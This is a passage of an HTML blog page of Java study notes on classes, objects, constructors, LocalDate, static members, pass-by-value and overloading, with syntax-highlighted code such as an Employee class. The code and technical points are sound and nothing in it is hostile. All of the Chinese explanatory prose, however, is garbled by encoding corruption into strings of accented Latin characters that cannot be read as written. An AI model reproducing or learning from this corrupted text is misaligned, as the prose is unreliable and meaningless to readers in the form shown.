eachã€‚</p><p>å¿«é€Ÿæ‰“å°ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">deepToString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="ç±»ä¸å¯¹è±¡"><a href="#ç±»ä¸å¯¹è±¡" class="headerlink" title="ç±»ä¸å¯¹è±¡"></a>ç±»ä¸å¯¹è±¡</h3><p><strong>é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ï¼ˆobject-oriented programming,OOPï¼‰</strong></p><p>ç”±ç±»æ„é€ (construct)å¯¹è±¡çš„è¿‡ç¨‹ç§°ä¸ºåˆ›å»ºç±»çš„å®ä¾‹ã€‚</p><p>å¯¹è±¡ä¸­çš„æ•°æ®ç§°ä¸ºå®ä¾‹å­—æ®µï¼Œæ“ä½œæ•°æ®çš„è¿‡ç¨‹ç§°ä¸ºæ–¹æ³•ã€‚</p><p>å®ç°å°è£…çš„å…³é”®åœ¨äºï¼Œç»å¯¹ä¸èƒ½è®©ç±»ä¸­çš„æ–¹æ³•ç›´æ¥è®¿é—®å…¶ä»–ç±»çš„å®ä¾‹å­—æ®µã€‚ç¨‹åºåªèƒ½é€šè¿‡å¯¹è±¡çš„æ–¹æ³•ä¸å¯¹è±¡è¿›è¡Œäº¤äº’ã€‚</p><p>Javaä¸­ï¼Œæ‰€æœ‰å…¶ä»–ç±»éƒ½æ‹“å±•è‡ªObjectç±»ã€‚</p><p>ç±»ä¹‹é—´ï¼Œæœ€å¸¸è§çš„å…³ç³»ï¼š</p><ul><li>ä¾èµ–ï¼ˆuses-aï¼‰</li><li>èšåˆï¼ˆhas-aï¼‰</li><li>ç»§æ‰¿ï¼ˆis-aï¼‰</li></ul><p>å¦‚æœä¸€ä¸ªç±»çš„æ–¹æ³•ä½¿ç”¨æˆ–æ“çºµå¦ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼Œæˆ‘ä»¬å°±è¯´ä¸€ä¸ªç±»ä¾èµ–äºå¦ä¸€ä¸ªç±»ã€‚</p><p>Javaä¸­ä½¿ç”¨æ„é€ å™¨æ„é€ æ–°å®ä¾‹ã€‚æ„é€ å™¨çš„åå­—åº”è¯¥ä¸ç±»åç›¸åŒã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Date</span> nowTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>nowTime<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å¯¹è±¡å˜é‡å¹¶æ²¡æœ‰å®é™…åŒ…å«ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒåªæ˜¯å¼•ç”¨ä¸€ä¸ªå¯¹è±¡ã€‚</p><p>åœ¨Javaä¸­ï¼Œä»»ä½•å¯¹è±¡å˜é‡çš„å€¼éƒ½æ˜¯å¯¹å­˜å‚¨åœ¨å¦ä¸€ä¸ªåœ°æ–¹çš„æŸä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚newæ“ä½œç¬¦çš„è¿”å›å€¼ä¹Ÿæ˜¯ä¸€ä¸ªå¼•ç”¨ã€‚</p><p>åœ¨Javaä¸­ï¼Œå¿…é¡»ä½¿ç”¨cloneæ–¹æ³•è·å¾—å¯¹è±¡çš„å®Œæ•´å‰¯æœ¬ã€‚</p><p>æ ‡å‡†Javaç±»åº“åˆ†åˆ«åŒ…å«äº†ä¸¤ä¸ªç±»ï¼šä¸€ä¸ªæ˜¯ç”¨æ¥è¡¨ç¤ºæ—¶é—´ç‚¹çš„Dateç±»ï¼Œå¦ä¸€ä¸ªæ˜¯å¤§å®¶ç†Ÿæ‚‰çš„æ—¥å†è¡¨ç¤ºæ³•è¡¨ç¤ºæ—¥æœŸçš„LocalDateç±»ã€‚</p><p>ä¸è¦ä½¿ç”¨æ„é€ å™¨æ¥æ„é€ LocalDateç±»çš„å¯¹è±¡ï¼Œåº”å½“ä½¿ç”¨é™æ€å·¥å‚æ–¹æ³•ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> date1 <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> date2 <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2001</span><span class="token punctuation">,</span><span class="token number">01</span><span class="token punctuation">,</span><span class="token number">02</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//2024-09-01</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//2001-01-02</span><span class="token keyword">int</span> year <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">getYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> month <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">getMonthValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> day <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">getDayOfMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>year<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2001</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>month<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>day<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span><span class="token class-name">LocalDate</span> date3 <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">plusDays</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2001-01-03</span><span class="token class-name">LocalDate</span> date4 <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">minusDays</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2001-01-01</span></code></pre><p><strong>æ›´æ”¹å™¨æ–¹æ³•ï¼š</strong>è°ƒç”¨è¿™ä¸ªæ–¹æ³•åï¼Œå¯¹è±¡çš„çŠ¶æ€ä¼šæ”¹å˜ã€‚</p><p><strong>è®¿é—®å™¨æ–¹æ³•ï¼š</strong>åªè®¿é—®å¯¹è±¡è€Œä¸ä¿®æ”¹å¯¹è±¡çš„æ–¹æ³•ã€‚</p><p>æ–‡ä»¶åå¿…é¡»ä¸publicç±»çš„åå­—ç›¸åŒ¹é…ã€‚åœ¨ä¸€ä¸ªæºæ–‡ä»¶ä¸­ï¼Œåªèƒ½æœ‰ä¸€ä¸ªå…¬å…±ç±»ï¼Œä½†å¯ä»¥æœ‰ä»»æ„æ•°ç›®çš„éå…¬å…±ç±»ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee_test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Employee</span><span class="token punctuation">[</span><span class="token punctuation">]</span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        staff<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"Carl Cracker"</span><span class="token punctuation">,</span> <span class="token number">75000</span><span class="token punctuation">,</span> <span class="token number">1987</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        staff<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"Harry Hacker"</span><span class="token punctuation">,</span> <span class="token number">50000</span><span class="token punctuation">,</span> <span class="token number">1989</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        staff<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"Tony Tester"</span><span class="token punctuation">,</span> <span class="token number">40000</span><span class="token punctuation">,</span> <span class="token number">1990</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span> e <span class="token operator">:</span> staff<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">raiseSalary</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span> e <span class="token operator">:</span> staff<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"name="</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",salary="</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",hireDay="</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getHireDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">LocalDate</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">double</span> salary<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">LocalDate</span> hireDay<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">double</span> salary<span class="token punctuation">,</span> <span class="token keyword">int</span> year<span class="token punctuation">,</span> <span class="token keyword">int</span> month<span class="token punctuation">,</span> <span class="token keyword">int</span> day<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">=</span> salary<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hireDay <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>year<span class="token punctuation">,</span> month<span class="token punctuation">,</span> day<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>salary<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">LocalDate</span> <span class="token function">getHireDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>hireDay<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">raiseSalary</span><span class="token punctuation">(</span><span class="token keyword">double</span> byPercent<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">double</span> raise <span class="token operator">=</span> salary<span class="token operator">*</span>byPercent<span class="token operator">/</span><span class="token number">100</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">+=</span> raise<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>æ„é€ å™¨</strong></p><p>æ„é€ å™¨ä¸ç±»åŒåã€‚åœ¨æ„é€ Employeeç±»çš„å¯¹è±¡æ—¶ï¼Œæ„é€ å™¨ä¼šè¿è¡Œï¼Œä»è€Œå°†å®ä¾‹å­—æ®µåˆå§‹åŒ–ä¸ºæ‰€å¸Œæœ›çš„åˆå§‹çŠ¶æ€ã€‚</p><p>æ„é€ å™¨æ€»æ˜¯ç»“åˆnewè¿ç®—ç¬¦æ¥è°ƒç”¨ã€‚ä¸èƒ½å¯¹ä¸€ä¸ªå·²ç»å­˜åœ¨çš„å¯¹è±¡è°ƒç”¨æ„é€ å™¨æ¥è¾¾åˆ°é‡æ–°è®¾ç½®å®ä¾‹å­—æ®µç›®çš„ã€‚</p><p>ä¸è¦åœ¨æ„é€ å™¨ä¸­å®šä¹‰ä¸å®ä¾‹å­—æ®µåŒåçš„å±€éƒ¨å˜é‡ã€‚</p><p><strong>ä»Java10å¼€å§‹ï¼Œå¯¹äºå±€éƒ¨å˜é‡ï¼Œå¦‚æœå¯ä»¥ä»å˜é‡çš„åˆå§‹å€¼æ¨æ–­å‡ºå®ƒçš„ç±»å‹ï¼Œå°±ä¸å†éœ€è¦å£°æ˜ç±»å‹ï¼Œåªéœ€è¦ä½¿ç”¨å…³é”®å­—varè€Œæ— éœ€æŒ‡å®šç±»å‹</strong></p><p>æ³¨æ„varå…³é”®å­—åªèƒ½ç”¨äºæ–¹æ³•ä¸­çš„å±€éƒ¨å˜é‡ã€‚å‚æ•°å’Œå­—æ®µçš„ç±»å‹å¿…é¡»å£°æ˜ã€‚</p><p>å¦‚æœå¯¹nullå€¼åº”ç”¨ä¸€ä¸ªæ–¹æ³•ï¼Œä¼šäº§ç”Ÿä¸€ä¸ª<code>NullPointerException</code>å¼‚å¸¸ã€‚</p><p><strong>éšå¼å‚æ•°å’Œæ˜¾å¼å‚æ•°</strong></p><p><code>raiseSalary</code>æ–¹æ³•æœ‰2ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ç§°ä¸ºéšå¼å‚æ•°ï¼Œæ˜¯å‡ºç°åœ¨æ–¹æ³•åå‰çš„Employeeç±»å‹çš„å¯¹è±¡ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä½äºæ–¹æ³•ååé¢æ‹¬å·ä¸­çš„æ•°å€¼ï¼Œè¿™äº‹ä¸€ä¸ªæ˜¾å¼å‚æ•°ã€‚</p><p>åœ¨æ¯ä¸€ä¸ªæ–¹æ³•ä¸­ï¼Œå…³é”®å­—<code>this</code>æŒ‡ç¤ºéšå¼å‚æ•°ã€‚</p><p><strong>æ³¨æ„ä¸è¦ç¼–å†™è¿”å›å¯å˜å¯¹è±¡å¼•ç”¨çš„è®¿é—®å™¨æ–¹æ³•</strong></p><p>å¦‚æœéœ€è¦è¿”å›ä¸€ä¸ªå¯å˜å¯¹è±¡çš„å¼•ç”¨ï¼Œé¦–å…ˆåº”è¯¥å¯¹å®ƒè¿›è¡Œå…‹éš†ã€‚å¯¹è±¡å…‹éš†æ˜¯æŒ‡å­˜æ”¾åœ¨å¦ä¸€ä¸ªæ–°ä½ç½®ä¸Šçš„å¯¹è±¡å‰¯æœ¬ã€‚</p><p><strong>ä¸€ä¸ªæ–¹æ³•å¯ä»¥è®¿é—®æ‰€å±ç±»çš„æ‰€æœ‰å¯¹è±¡çš„ç§æœ‰æ•°æ®</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getOtherName</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> other<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> other<span class="token punctuation">.</span>name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token class-name">Employee</span> other <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"fengfeng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">2001</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getOtherName</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>staff[0]å¯¹è±¡çš„<code>getOtherName</code>æ–¹æ³•è¿˜å¯ä»¥è®¿é—®otherå¯¹è±¡çš„ç§æœ‰å­—æ®µnameï¼Œæ˜¯å› ä¸ºä»–ä»¬éƒ½æ˜¯<code>Employee</code>ç±»å‹å¯¹è±¡ï¼Œ<code>Employee</code>ç±»çš„æ–¹æ³•å¯ä»¥è®¿é—®ä»»æ„<code>Employee</code>ç±»å‹å¯¹è±¡çš„ç§æœ‰å­—æ®µã€‚</p><p>å¯ä»¥å°†å®ä¾‹å­—æ®µå®šä¹‰ä¸ºfinalã€‚è¿™æ ·çš„å­—æ®µå¿…é¡»åœ¨æ„é€ å¯¹è±¡æ—¶åˆå§‹åŒ–ï¼Œå¹¶ä¸”ä»¥åä¸èƒ½å†ä¿®æ”¹è¿™ä¸ªå­—æ®µã€‚</p><p>å¦‚æœç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•éƒ½ä¸ä¼šæ”¹å˜å…¶å¯¹è±¡ï¼Œè¿™æ ·çš„ç±»å°±æ˜¯ä¸å¯å˜çš„ç±»ã€‚</p><p><strong>é™æ€å­—æ®µ</strong></p><p>å¦‚æœå°†ä¸€ä¸ªå­—æ®µå®šä¹‰ä¸ºstaticï¼Œæ¯ä¸ªç±»åªæœ‰ä¸€ä¸ªè¿™æ ·çš„å­—æ®µã€‚è€Œå¯¹äºéé™æ€çš„å®ä¾‹å­—æ®µï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰è‡ªå·±çš„ä¸€ä¸ªå‰¯æœ¬ã€‚</p><p>é™æ€å­—æ®µå±äºç±»ï¼Œè€Œä¸å±äºä»»ä½•å•ä¸ªçš„å¯¹è±¡ã€‚</p><p><strong>é™æ€å¸¸é‡</strong></p><p>é™æ€å¸¸é‡å¾ˆå¸¸ç”¨ï¼Œä¾‹å¦‚ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">double</span> <span class="token constant">PI</span> <span class="token operator">=</span> <span class="token number">3.141592653</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ç„¶åå°±å¯ä»¥ç”¨<code>Employee.PI</code>æ¥è®¿é—®è¿™ä¸ªé™æ€å¸¸é‡ã€‚</p><p><strong>é™æ€æ–¹æ³•</strong></p><p>é™æ€æ–¹æ³•æ˜¯ä¸åœ¨å¯¹è±¡ä¸Šæ‰§è¡Œçš„æ–¹æ³•ã€‚ä¾‹å¦‚Mathç±»çš„powæ–¹æ³•ã€‚</p><p>å¯ä»¥è®¤ä¸ºé™æ€æ–¹æ³•æ˜¯æ²¡æœ‰<code>this</code>å‚æ•°çš„æ–¹æ³•ï¼ˆæ²¡æœ‰éšå¼å‚æ•°ï¼‰</p><p>é™æ€æ–¹æ³•ä¸èƒ½è®¿é—®å®ä¾‹å­—æ®µï¼Œä½†æ˜¯å¯ä»¥è®¿é—®é™æ€å­—æ®µã€‚</p><p>å»ºè®®ä½¿ç”¨ç±»åè€Œä¸æ˜¯å¯¹è±¡æ¥è°ƒç”¨é™æ€æ–¹æ³•ã€‚</p><p>ä¸‹é¢ä¸¤ç§æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨é™æ€æ–¹æ³•ï¼š</p><ul><li>æ–¹æ³•ä¸éœ€è¦è®¿é—®å¯¹è±¡çŠ¶æ€ï¼Œå› ä¸ºå®ƒéœ€è¦çš„æ‰€æœ‰å‚æ•°éƒ½é€šè¿‡æ˜¾å¼å‚æ•°æä¾›ã€‚</li><li>æ–¹æ³•åªéœ€è¦è®¿é—®ç±»çš„é™æ€å­—æ®µã€‚</li></ul><p><strong>Javaç¨‹åºè®¾è®¡è¯­è¨€æ€»æ˜¯é‡‡ç”¨æŒ‰å€¼è°ƒç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–¹æ³•å¾—åˆ°çš„æ˜¯æ‰€æœ‰å‚æ•°å€¼çš„ä¸€ä¸ªå‰¯æœ¬ã€‚</strong>å…·ä½“æ¥è®²ï¼Œæ–¹æ³•ä¸èƒ½ä¿®æ”¹ä¼ é€’ç»™å®ƒçš„ä»»ä½•å‚æ•°å˜é‡çš„å†…å®¹ã€‚</p><p>æ–¹æ³•å¾—åˆ°çš„æ˜¯å¯¹è±¡å¼•ç”¨çš„å‰¯æœ¬ï¼ŒåŸæ¥çš„å¯¹è±¡å¼•ç”¨å’Œè¿™ä¸ªå‰¯æœ¬éƒ½å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ã€‚</p><p>å®é™…ä¸Šï¼Œå¯¹è±¡å¼•ç”¨æ˜¯æŒ‰å€¼ä¼ é€’çš„ã€‚</p><ul><li>æ–¹æ³•ä¸èƒ½ä¿®æ”¹åŸºæœ¬æ•°æ®ç±»å‹çš„å‚æ•°ã€‚</li><li>æ–¹æ³•å¯ä»¥æ”¹å˜å¯¹è±¡å‚æ•°çš„çŠ¶æ€ã€‚</li><li>æ–¹æ³•ä¸èƒ½è®©ä¸€ä¸ªå¯¹è±¡å‚æ•°å¼•ç”¨ä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚</li></ul><p><strong>é‡è½½</strong></p><p>å¦‚æœå¤šä¸ªæ–¹æ³•æœ‰ç›¸åŒçš„åå­—ã€ä¸åŒçš„å‚æ•°ï¼Œä¾¿å‡ºç°äº†é‡è½½ã€‚ç¼–è¯‘å™¨å¿…é¡»æŒ‘é€‰å‡ºå…·ä½“è°ƒç”¨å“ªä¸ªæ–¹æ³•ã€‚</p><blockquote><p>Javaå…è®¸é‡è½½ä»»ä½•æ–¹æ³•ï¼Œè€Œä¸åªæ˜¯æ„é€ å™¨æ–¹æ³•ã€‚å› æ­¤ï¼Œè¦å®Œæ•´åœ°æè¿°ä¸€ä¸ªæ–¹æ³•ï¼Œéœ€è¦æŒ‡å®šæ–¹æ³•åä»¥åŠå‚æ•°ç±»å‹ã€‚è¿™å«åšæ–¹æ³•çš„ç­¾åã€‚</p><p><strong>è¿”å›ç±»å‹ä¸æ˜¯æ–¹æ³•ç­¾åçš„ä¸€éƒ¨åˆ†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸èƒ½æœ‰ä¸¤ä¸ªåå­—ç›¸åŒã€ç±»å‹å‚æ•°ä¹Ÿç›¸åŒå´æœ‰ä¸åŒè¿”å›ç±»å‹çš„æ–¹æ³•ã€‚</strong></p></blockquote><p>å¦‚æœåœ¨æ„é€ å™¨ä¸­æ²¡æœ‰æ˜¾å¼åœ°ä¸ºå­—æ®µè®¾ç½®å€¼ï¼Œé‚£ä¹ˆå°±ä¼šè¢«è‡ªåŠ¨åœ°èµ‹ä¸ºé»˜è®¤å€¼ï¼šæ•°å€¼ä¸º0ã€å¸ƒå°”å€¼ä¸ºfalseã€å¯¹è±¡å¼•ç”¨ä¸ºnullã€‚</p><blockquote><p>æ–¹æ³•ä¸­çš„å±€éƒ¨å˜é‡å¿…é¡»æ˜ç¡®åœ°åˆå§‹åŒ–ï¼Œä½†æ˜¯åœ¨ç±»ä¸­ï¼Œå¦‚æœæ²¡æœ‰åˆå§‹åŒ–ç±»ä¸­çš„å­—æ®µï¼Œå°†ä¼šè‡ªåŠ¨åˆå§‹åŒ–ä¸ºé»˜è®¤å€¼ã€‚</p></blockquote><p>æ— å‚æ„é€ å™¨åˆ›å»ºå¯¹è±¡æ—¶ï¼Œå¯¹è±¡çš„çŠ¶æ€ä¼šè®¾ç½®ä¸ºé€‚å½“çš„é»˜è®¤å€¼ã€‚å¦‚æœå†™ä¸€ä¸ªç±»æ—¶æ²¡æœ‰ç¼–å†™æ„é€ å™¨ï¼Œå°±ä¼šä¸ºä½ æä¾›ä¸€ä¸ªæ— å‚æ•°æ„é€ å™¨ã€‚è¿™ä¸ªæ„é€ å™¨å°†æ‰€æœ‰çš„å®ä¾‹å­—æ®µè®¾ç½®ä¸ºé»˜è®¤å€¼ã€‚</p><p>å¦‚æœç±»ä¸­æä¾›äº†è‡³å°‘ä¸€ä¸ªæ„é€ å™¨ï¼Œä½†æ˜¯æ²¡æœ‰æä¾›æ— å‚æ•°çš„æ„é€ å™¨ï¼Œé‚£ä¹ˆæ„é€ å¯¹è±¡æ—¶å¦‚æœä¸æä¾›å‚æ•°å°±æ˜¯ä¸åˆæ³•çš„ã€‚</p><p>å¯ä»¥åœ¨ç±»å®šä¹‰ä¸­ç›´æ¥ä¸ºä»»ä½•å­—æ®µèµ‹å€¼ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token operator">=</span><span class="token string">"feng"</span><span class="token punctuation">;</span></code></pre><p>åˆå§‹å€¼ä¸ä¸€å®šæ˜¯å¸¸é‡å€¼ï¼Œå¯ä»¥åˆ©ç”¨æ–¹æ³•è°ƒç”¨åˆå§‹åŒ–ä¸€ä¸ªå­—æ®µï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> nextId <span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token operator">=</span> <span class="token 